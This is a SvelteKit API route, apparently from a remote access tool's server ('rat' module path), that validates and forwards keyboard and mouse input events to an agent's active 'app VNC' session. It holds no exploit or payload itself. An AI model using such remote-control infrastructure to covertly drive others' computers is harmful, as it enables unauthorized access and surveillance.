import { error, json } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { appVncManager, AppVncError } from '$lib/server/rat/app-vnc';
import { sanitizeAppVncInputEvents, type RawAppVncInputEvent } from '$lib/server/rat/app-vnc-input';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Agent identifier is required');
	}

	let payload: Record<string, unknown>;
	try {
		payload = await request.json();
	} catch {
		throw error(400, 'Invalid JSON payload');
	}

	const sessionId = typeof payload.sessionId === 'string' ? payload.sessionId.trim() : '';
	if (!sessionId) {
		throw error(400, 'Session identifier is required');
	}

	const eventsRaw = Array.isArray(payload.events) ? (payload.events as RawAppVncInputEvent[]) : [];
	if (eventsRaw.length === 0) {
		throw error(400, 'No input events provided');
	}

	const session = appVncManager.getSession(id);
	if (!session || !session.active || session.id !== sessionId) {
		throw error(404, 'No active app VNC session');
	}

	const sanitized = sanitizeAppVncInputEvents(eventsRaw);
	if (sanitized.length === 0) {
		return json({ accepted: false, reason: 'filtered' });
	}

	try {
		const result = appVncManager.dispatchInput(id, session.id, sanitized);
		return json({
			accepted: true,
			count: sanitized.length,
			delivered: result.delivered,
			sequence: result.sequence ?? undefined
		});
	} catch (err) {
		if (err instanceof AppVncError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to dispatch app VNC input command');
	}
};
